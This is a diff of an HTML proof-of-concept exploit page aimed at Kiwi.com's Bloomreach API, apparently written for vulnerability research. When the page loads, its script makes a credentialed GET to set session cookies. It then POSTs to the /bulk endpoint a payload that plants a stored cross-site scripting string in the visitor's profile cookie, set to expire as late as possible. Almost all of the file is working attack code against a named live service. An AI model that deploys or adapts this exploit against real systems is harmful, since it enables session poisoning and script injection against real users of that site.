@@ -2,82 +2,107 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC - Kiwi.com / Bloomreach API Exploit</title>
+    <title>Exploit PoC - Kiwi.com / Bloomreach API</title>
     <style>
-        body { font-family: sans-serif; background-color: #f4f4f4; padding: 50px; text-align: center; }
-        .status { padding: 20px; border-radius: 8px; background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1); display: inline-block; }
-        .success { color: green; font-weight: bold; }
-        .error { color: red; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; padding: 40px; text-align: center; }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 600px; width: 100%; }
+        h2 { color: #1a73e8; }
+        .step { margin: 15px 0; padding: 10px; border-left: 4px solid #ccc; text-align: left; background: #fafafa; }
+        .active { border-left-color: #1a73e8; background: #e8f0fe; }
+        .done { border-left-color: #34a853; background: #e6f4ea; }
+        #log { font-family: monospace; font-size: 13px; color: #333; margin-top: 20px; white-space: pre-wrap; text-align: left; border: 1px solid #ddd; padding: 10px; height: 150px; overflow-y: auto; }
     </style>
 </head>
 <body>
-    <div class="status">
-        <h2>Vulnerability Research: Bloomreach API Misconfiguration</h2>
-        <p id="step">Initializing Attack Chain...</p>
-        <div id="log" style="text-align: left; font-family: monospace; font-size: 12px; margin-top: 20px; border-top: 1px solid #ccc; padding-top: 10px;"></div>
-    </div>
 
-    <script>
-        const projectId = "bd6048c2-c115-11ea-b1b2-6e9e95c44d66";
-        const bundleUrl = `https://bloomreach-api.kiwi.com/webxp/projects/bd6048c2-c115-11ea-b1b2-6e9e95c44d66/bundle`;
-        const bulkUrl = "https://bloomreach-api.kiwi.com/bulk";
-        const logDiv = document.getElementById('log');
+<div class="container">
+    <h2>Bloomreach Session Poisoning PoC</h2>
+    <p>Target: <strong>bloomreach-api.kiwi.com</strong></p>
+    
+    <div id="step1" class="step">Step 1: Initializing Session (GET bundle)</div>
+    <div id="step2" class="step">Step 2: Injecting Malicious Payload (POST bulk)</div>
+    
+    <div id="log">Initializing Exploit Chain...</div>
+</div>
 
-        function addLog(msg) {
-            logDiv.innerHTML += `> ${msg}<br>`;
-        }
+<script>
+    const projectId = "bd6048c2-c115-11ea-b1b2-6e9e95c44d66";
+    const bundleUrl = `https://bloomreach-api.kiwi.com/webxp/projects/${projectId}/bundle`;
+    const bulkUrl = "https://bloomreach-api.kiwi.com/bulk";
+    const logElem = document.getElementById('log');
 
-        async function startExploit() {
-            try {
-                // المرحلة 1: تهيئة الكوكيز (Session Sync)
-                addLog("Step 1: Syncing session with Bloomreach (Setting Cookies)...");
-                await fetch(bundleUrl, { mode: 'cors', credentials: 'include' });
-                addLog("Session initialized successfully.");
+    function updateLog(msg) {
+        logElem.innerHTML += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
+        logElem.scrollTop = logElem.scrollHeight;
+    }
 
-                // انتظار ثانية لضمان استقرار الكوكيز في المتصفح
-                await new Promise(r => setTimeout(r, 1000));
+    async function runExploit() {
+        try {
+            // المرحلة الأولى: طلب GET لجلب الكوكيز الأساسية
+            document.getElementById('step1').classList.add('active');
+            updateLog("Executing GET request to fetch bundle and set cookies...");
+            
+            await fetch(bundleUrl, {
+                mode: 'cors',
+                credentials: 'include' // إرسال واستقبال الكوكيز
+            });
 
-                // المرحلة 2: حقن الحمولة (The Poisoning)
-                addLog("Step 2: Injecting Malicious Payload via /bulk...");
-                const payload = {
-                    "sdk": "js-client",
-                    "sdk_version": "v3.50.0",
-                    "sdk_snippet_version": "v2.7.0",
-                    "commands": [{
-                        "name": "system/ids",
-                        "data": {
-                            "project_id": projectId,
-                            "cookie": "<img src=x onerror=alert('XSS')>",
-                            "customer": {},
-                            "expires": 1867308609
-                        }
-                    }]
-                };
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step1').classList.add('done');
+            updateLog("Step 1 Complete: Cookies (xnpe_...) should now be set in the browser.");
 
-                const response = await fetch(bulkUrl, {
-                    method: "POST",
-                    mode: "cors",
-                    credentials: "include",
-                    headers: { "Content-Type": "text/plain;charset=UTF-8" },
-                    body: JSON.stringify(payload)
-                });
+            // انتظار ثانية واحدة لضمان استقرار الجلسة
+            await new Promise(r => setTimeout(r, 1500));
 
-                if (response.ok) {
-                    const resData = await response.json();
-                    addLog("Response Received: 200 OK");
-                    document.getElementById('step').innerHTML = "<span class='success'>Exploit Chain Completed! Session Poisoned.</span>";
-                    addLog("Payload is now stored in the victim's Bloomreach profile.");
-                    addLog("Impact: Visit Kiwi.com to trigger XSS or witness WAF 403 block.");
-                } else {
-                    addLog(`<span class='error'>Failed: Server returned status ${response.status}</span>`);
-                }
+            // المرحلة الثانية: طلب POST لحقن الحمولة (Payload)
+            document.getElementById('step2').classList.add('active');
+            updateLog("Executing POST request to /bulk with malicious payload...");
 
-            } catch (err) {
-                addLog(`<span class='error'>Error: ${err.message}</span>`);
+            const payload = {
+                "sdk": "js-client",
+                "sdk_version": "v3.50.0",
+                "sdk_snippet_version": "v2.7.0",
+                "commands": [{
+                    "name": "system/ids",
+                    "data": {
+                        "project_id": projectId,
+                        "cookie": "<img src=x onerror=alert('XSS_POC_SUCCESS')>",
+                        "customer": {},
+                        "expires": 2147483647 // لضمان بقاء الحمولة لأطول فترة
+                    }
+                }]
+            };
+
+            const response = await fetch(bulkUrl, {
+                method: "POST",
+                mode: "cors",
+                credentials: "include",
+                headers: {
+                    "Content-Type": "text/plain;charset=UTF-8"
+                },
+                body: JSON.stringify(payload)
+            });
+
+            const result = await response.json();
+
+            if (response.ok && result.success) {
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step2').classList.add('done');
+                updateLog("Step 2 Complete: Payload successfully injected!");
+                updateLog("Server Response: " + JSON.stringify(result.results[0]));
+                alert("Exploit Finished! The payload is now tied to your Bloomreach session.");
+            } else {
+                updateLog("Step 2 Failed: " + response.status);
             }
-        }
 
-        startExploit();
-    </script>
+        } catch (err) {
+            updateLog("ERROR: " + err.message);
+        }
+    }
+
+    // بدء التنفيذ
+    runExploit();
+</script>
+
 </body>
 </html>
